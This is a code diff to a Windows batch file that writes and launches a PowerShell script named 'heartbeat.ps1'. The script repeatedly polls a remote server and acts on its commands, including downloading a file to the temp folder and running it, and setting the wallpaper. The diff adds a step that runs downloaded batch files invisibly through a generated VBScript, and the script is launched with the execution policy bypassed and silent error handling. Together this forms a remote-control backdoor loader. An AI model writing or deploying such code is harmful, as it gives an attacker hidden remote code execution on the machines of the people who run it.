@@ -14,7 +14,14 @@ echo                     $fileName = [System.IO.Path]::GetFileName($uri.LocalPat
 echo                     if (-not $fileName) { $fileName = "downloaded_file" } >> heartbeat.ps1
 echo                     $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName) >> heartbeat.ps1
 echo                     Invoke-WebRequest -Uri $response.value -OutFile $tempPath >> heartbeat.ps1
-echo                     Start-Process -FilePath $tempPath -WindowStyle Maximized >> heartbeat.ps1
+echo                     if ($tempPath -like "*.bat") { >> heartbeat.ps1
+echo                         $vbsPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "run_silent.vbs") >> heartbeat.ps1
+echo                         $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run """' + $tempPath + '""", 0, False' >> heartbeat.ps1
+echo                         Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII >> heartbeat.ps1
+echo                         Start-Process -FilePath $vbsPath >> heartbeat.ps1
+echo                     } else { >> heartbeat.ps1
+echo                         Start-Process -FilePath $tempPath -WindowStyle Maximized >> heartbeat.ps1
+echo                     } >> heartbeat.ps1
 echo                 } >> heartbeat.ps1
 echo                 "set_wallpaper" { >> heartbeat.ps1
 echo                     $uri = [System.Uri]$response.value >> heartbeat.ps1
@@ -42,5 +49,6 @@ echo         # Silent error handling >> heartbeat.ps1
 echo     } >> heartbeat.ps1
 echo     Start-Sleep -Seconds 20 >> heartbeat.ps1
 echo } >> heartbeat.ps1
+
 :: Run the PowerShell script
 powershell -ExecutionPolicy Bypass -File heartbeat.ps1
